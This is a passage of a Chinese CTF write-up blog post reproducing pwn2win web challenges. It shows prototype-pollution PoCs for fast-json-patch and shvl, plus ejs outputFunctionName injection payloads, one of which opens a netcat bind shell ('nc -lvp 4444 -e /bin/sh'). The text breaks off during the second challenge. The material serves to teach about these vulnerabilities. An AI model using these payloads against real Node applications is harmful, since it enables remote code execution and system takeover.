@@ -1,0 +1,263 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pwn2win各种尝试复现 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="前言因为美团。dozer和学校各种事情结果没能打上pwn2win，不过告一段落之后马上来做做国际赛长长见识，第一个就是。全都是node题目啊【不会】，不过感觉还是相当有趣的！
+illusion这题是,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pwn2win各种尝试复现</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pwn2win各种尝试复现</h1>
+        <div class="stuff">
+            <span>六月 01, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/node/" rel="tag">node</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">原型链污染</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为美团。dozer和学校各种事情结果没能打上pwn2win，不过告一段落之后马上来做做国际赛长长见识，第一个就是。全都是node题目啊【不会】，不过感觉还是相当有趣的！</p>
+<h1 id="illusion"><a href="#illusion" class="headerlink" title="illusion"></a>illusion</h1><p>这题是最简单的，也是最多人做出来的，可是我却不知道咋复现[因为我不会那个什么hashcash计算，希望有师傅看见了能告诉我呜呜</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><pre><code>+ 看附件
++ 原型链污染
++ ejs RCE</code></pre>
+<p>题目开出给了dockerfile(重要)和 源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jsonpatch = <span class="built_in">require</span>(<span class="string">&#x27;fast-json-patch&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> basicAuth = <span class="built_in">require</span>(<span class="string">&#x27;express-basic-auth&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middlewares //</span></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(basicAuth(&#123;</span><br><span class="line">    users: &#123; <span class="string">&quot;admin&quot;</span>: process.env.SECRET || <span class="string">&quot;admin&quot;</span> &#125;,</span><br><span class="line">    challenge: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> services = &#123;</span><br><span class="line">    status: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    cameras: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    doors: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    dome: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    turrets: <span class="string">&quot;online&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Static folder</span></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/templates/index.ejs&quot;</span>, &#123;services&#125;)</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码很短，随便审计就审计完了，一般原型链污染都处于能够被用户自定义控制的地方，所以重点看看</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">      jsonpatch.applyPatch(services, patch)</span><br></pre></td></tr></table></figure>
+
+<p>发现他用了一个patch什么的，到package.json中可以看见：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么应该就是这个fast-json-path库的问题，去github上搜搜看能够找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Starcounter-Jack&#x2F;JSON-Patch&#x2F;pull&#x2F;262</span><br></pre></td></tr></table></figure>
+
+
+
+<p>别人给出的poc：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">let</span> fastjsonpatch = <span class="built_in">require</span>(<span class="string">&quot;fast-json-patch&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + b.polluted);</span><br><span class="line"><span class="keyword">const</span> patch = [&#123;<span class="attr">op</span>: <span class="string">&quot;replace&quot;</span>, <span class="attr">path</span>: <span class="string">&quot;/constructor/prototype/polluted&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;];</span><br><span class="line">fastjsonpatch.applyPatch(a, patch);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + b.polluted);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210601220006513.png" alt="image-20210601220006513"></p>
+<p>看了看不就和题目出的一模一样吗，但是话又回来，我们却发现即使能够原型链污染了好像还是没啥用啊草。</p>
+<p><img src="image-20210601215202253.png" alt="image-20210601215202253"></p>
+<p>这时候再观察package.json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现ejs，搜了一下ejs原来是一个可以用于RCE的点。只要污染outputFunctionName 这个点就可以进行命令执行。</p>
+<p>那么尝试</p>
+<p><img src="image-20210601215319818.png" alt="image-20210601215319818"></p>
+<p>然后就可以发现写入了，但是看了别人的WP发现这样是不行的，因为还给了你dockerfile</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag.txt /root/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy readflag binary (it just reads the flag)</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readflag /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 4755 /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install web application</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /app &amp;&amp; npm install</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change to guest user</span></span><br><span class="line"><span class="keyword">USER</span> <span class="number">405</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># run application and stay alive for 5 minutes</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> entrypoint.sh / </span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看见作为guest我们是没有写入权限的，那么就只能去打反弹shell了，网上exp一大堆随便找一个来打就可以了</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt; src/static/style.css&#x27;);x&quot;</span><br><span class="line">无法写入之后就打反弹shell</span><br><span class="line"> &quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;nc -lvp 4444 -e /bin/sh&#x27;);x&quot;</span><br><span class="line"># 这里发现老外的思路又和我平常打反弹shell不一样，写成这样payload的话我们ncip过去就可以了</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="small-talk"><a href="#small-talk" class="headerlink" title="small-talk"></a>small-talk</h1><p>又是JS题目</p>
+<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>原型链污染</li>
+<li>XSS</li>
+</ul>
+<p>能够看到源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: gunicorn</span><br><span class="line"><span class="built_in">Date</span>: Tue, <span class="number">0</span>1 Jun <span class="number">2021</span> <span class="number">12</span>:<span class="number">0</span>8:<span class="number">22</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Length: <span class="number">2043</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Share your thoughts&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;/static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/shvl@latest/dist/shvl.umd.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/@popperjs/core@2&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;wrap --rtn&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;form action=<span class="string">&quot;/admin&quot;</span> method=<span class="string">&quot;POST&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;js-usr-new&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;select__label text&quot;</span>&gt;Share your coach phrases <span class="keyword">with</span> our admin&lt;/div&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;url&quot;</span> name=<span class="string">&quot;url&quot;</span> placeholder=<span class="string">&quot;address&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-elem ui-elem-email text&quot;</span> /&gt;</span><br><span class="line">        &lt;button id=<span class="string">&quot;send-button&quot;</span> type=<span class="string">&quot;submit&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-button text&quot;</span>&gt;send&lt;/button&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;send-tooltip&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip&quot;</span> role=<span class="string">&quot;tooltip&quot;</span>&gt;</span><br><span class="line">            go ahead, click me :)</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip-arrow&quot;</span> data-popper-arrow&gt;&lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;div id=<span class="string">&quot;quote&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">&#x27;#quote-base&#x27;</span> src=<span class="string">&quot;/quotes&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> button = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-button&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> tooltip = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-tooltip&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> message = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#quote&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.removeEventListener(<span class="string">&#x27;message&#x27;</span>, setup);</span><br><span class="line">          quote = &#123;<span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br><span class="line">          </span><br><span class="line">          message.textContent = <span class="built_in">Object</span>.values(quote)[<span class="number">1</span>] + <span class="string">&#x27; â &#x27;</span> + <span class="built_in">Object</span>.values(quote)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> popperInstance = Popper.createPopper(button, tooltip, &#123;</span><br><span class="line">              placement: <span class="string">&#x27;bottom&#x27;</span>,</span><br><span class="line">              modifiers: [</span><br><span class="line">                  &#123;</span><br><span class="line">                  name: <span class="string">&#x27;offset&#x27;</span>,</span><br><span class="line">                  options: &#123;</span><br><span class="line">                      offset: [<span class="number">0</span>, <span class="number">8</span>],</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#125;,</span><br><span class="line">              ],</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现有个quotes，进去看看</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    phrases = [</span><br><span class="line">        &#123;<span class="string">&#x27;@entrepreneur&#x27;</span>: <span class="string">&#x27;The distance between your DREAMS and REALITY is called ACTION&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@successman&#x27;</span>: <span class="string">&#x27;MOTIVATION is what gets you started, HABIT is what keeps you going&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bornrich&#x27;</span>: <span class="string">&#x27;It\&#x27;s hard to beat someone that never gives up&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@businessman&#x27;</span>: <span class="string">&#x27;Work while they sleep. Then live like they dream&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bigboss&#x27;</span>: <span class="string">&#x27;Life begins at the end of your comfort zone&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@daytrader&#x27;</span>: <span class="string">&#x27;A successfull person never loses... They either win or learn!&#x27;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">6</span>)</span><br><span class="line">        parent.postMessage(<span class="string">&#x27;&#123;&quot;author&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.keys(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;, &quot;message&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.values(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后就没了，想了半天去挨个搜require的东西，结果shvl这个就有问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robinvdvleuten&#x2F;shvl&#x2F;pull&#x2F;35</span><br></pre></td></tr></table></figure>
+
+<p>别人给出的poc：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">var</span> shvl = <span class="built_in">require</span>(<span class="string">&quot;shvl&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before: &quot;</span> + &#123;&#125;.polluted)</span><br><span class="line">shvl.set(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After: &quot;</span> + &#123;&#125;.polluted)</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210601220413714.png" alt="image-20210601220413714"></p>
+<p>然后翻这段代码，就可以发现</p>
